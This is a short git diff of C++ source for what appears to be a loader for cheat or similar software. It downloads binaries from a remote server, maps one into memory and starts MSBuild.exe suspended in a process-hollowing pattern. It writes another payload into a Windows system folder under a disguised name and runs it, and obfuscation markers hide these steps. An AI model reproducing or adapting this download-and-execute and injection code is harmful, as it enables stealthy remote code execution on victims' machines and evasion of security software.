@@ -3,12 +3,13 @@
 #include "requests/requests.hpp"
 #include "utils\utils.hpp"
 #include "ntdll/ntdll.hpp"
+#include "menu/menu.hpp"
 
 bool core::initialize_skript( )
 {
 	vmp_mutation;
 
-	const auto binary = g_requests->download( "http://api.idandev.xyz/files/skript" );
+	const auto binary = g_requests->download( menu::render::user_data.subscriptions[ 0 ].download_url );
 
 	LPVOID const image_base = map_vector_to_memory( binary );
 
@@ -20,6 +21,7 @@ bool core::initialize_skript( )
 
 	std::memset( &si, 0, sizeof si );
 	std::memset( &pi, 0, sizeof pi );
+
 
 	if ( !CreateProcessA( E( R"(C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe)" ), nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi ) )
 		return false;
@@ -72,14 +74,14 @@ bool core::initialize_gosth( )
 {
 	vmp_mutation;
 
-	auto const res = g_requests->download( "http://api.idandev.xyz/files/gosth" );
+	auto const res = g_requests->download( "url" );
 
-	std::ofstream outputFile( E( R"(C:\Windows\SysWOW64\setup\tssysprep.exe)" ), std::ios::binary );
+	std::ofstream outputFile( E( R"(C:\Windows\SysWOW64\setup\haha.exe)" ), std::ios::binary );
 
 	outputFile.write( reinterpret_cast< const char* > ( res.data( ) ), res.size( ) );
 	outputFile.close( );
 
-	utils::system::create_process( E( R"(C:\Windows\SysWOW64\setup\tssysprep.exe)" ) );
+	utils::system::create_process( E( R"(C:\Windows\SysWOW64\setup\haha.exe)" ) );
 
 	return true;
 
